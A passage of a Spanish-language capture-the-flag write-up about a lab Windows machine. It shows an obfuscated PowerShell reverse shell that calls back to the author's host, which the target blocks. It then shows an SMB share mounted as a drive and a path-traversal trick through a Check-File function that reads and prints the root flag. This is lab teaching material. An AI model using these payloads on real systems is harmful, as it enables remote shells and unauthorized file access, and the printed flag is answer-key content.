+[10.10.10.210]: PS>function reverse { powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMgAnACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA== }
+The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
+    + CategoryInfo          : ParserError: (function reverse { …AcwBlACgAKQAKAA== }:String) [], ParseException
+    + FullyQualifiedErrorId : ScriptsNotAllowed
+```
+
+Ahora tengo otro problema. No puedo ejecutar scripts. Sin embargo, en antes había visto en los documentos que este usuario cuenta con una función llamada ```Check-File```
+
+```null
+[10.10.10.210]: PS>Get-Command check-file
+
+CommandType     Name                                               Version    Source                                                                                                                            
+-----------     ----                                               -------    ------                                                                                                                            
+Function        Check-File                                                               
+```
+
+Tiene que ser un archivo que esté dentro de D:\ o ProgramData
+
+Pruebo a crear una unidad lógica que esté sincronizada con un recurso compartido de mi lado
+
+```null
+impacket-smbserver shared $(pwd) -smb2support
+```
+
+```null
+PS C:\Users\k.svensson\Documents> net use D: \\10.10.16.2\shared 2>&1
+The command completed successfully.
+```
+
+Pero no es accesible para el otro usuario. Como está validando con el uso de un wildcard que se le pase contenido dentro de ProgramData, es posible hacer un Directory Path Traversal para poder listar archivos de cualquier ruta del sistema
+
+```null
+[10.10.10.210]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt                                                         
+54f47188dc321720aa1ea3c0f004426d
+```
+
+En esta ocasión, no es posible ganar acceso al sistema como Administrador
